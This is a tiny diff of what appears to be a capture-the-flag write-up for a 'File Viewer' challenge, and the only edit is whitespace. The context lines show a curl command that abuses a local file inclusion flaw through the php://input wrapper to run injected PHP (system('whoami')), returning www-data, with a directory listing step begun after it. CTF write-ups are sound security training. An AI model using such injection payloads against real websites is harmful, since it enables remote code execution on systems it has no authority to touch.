@@ -1,6 +1,6 @@
 # File Viewer
 
-Basic LFI Vuln
+Basic LFI Vuln  
 curl -XPOST 'https://file_viewer.tjctf.org/reader.php?file=php://input' -d '<?php system("whoami"); ?>' - www-data
 ls -la:  
 ```
